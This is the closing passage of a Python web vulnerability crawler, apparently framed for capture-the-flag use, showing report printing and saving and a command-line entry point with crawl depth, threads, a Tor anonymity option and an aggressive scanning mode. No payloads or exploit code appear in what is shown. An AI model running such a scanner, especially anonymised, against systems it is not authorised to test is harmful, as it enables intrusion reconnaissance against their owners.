                cprint(f"\n{vuln_type.replace('_', ' ').title()} Vulnerabilities:", 'red')
                for vuln in vulns:
                    cprint(f"  - {vuln.get('url', vuln.get('endpoint'))}: {vuln.get('evidence', 'N/A')[:50]}...", 'red')
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            self.log_message(f"Report saved to {output_file}", 'green', '[REPORT]')

async def main():
    parser = argparse.ArgumentParser(description='Commander-Grade CTF Web Vulnerability Crawler v4.3')
    parser.add_argument('url', help='Target URL to crawl')
    parser.add_argument('-d', '--depth', type=int, default=3, help='Max crawl depth')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads')
    parser.add_argument('--delay', type=float, default=1, help='Delay between requests')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('--tor', action='store_true', help='Use Tor for anonymity')
    parser.add_argument('--aggressive', action='store_true', help='Enable aggressive scanning mode')
    
    args = parser.parse_args()
    crawler = EnhancedCTFCrawler(
        args.url, args.depth, args.threads, args.delay, args.timeout, args.tor, args.aggressive
    )
    await crawler.crawl()
    crawler.generate_enhanced_report(args.output)

if __name__ == '__main__':
    asyncio.run(main())
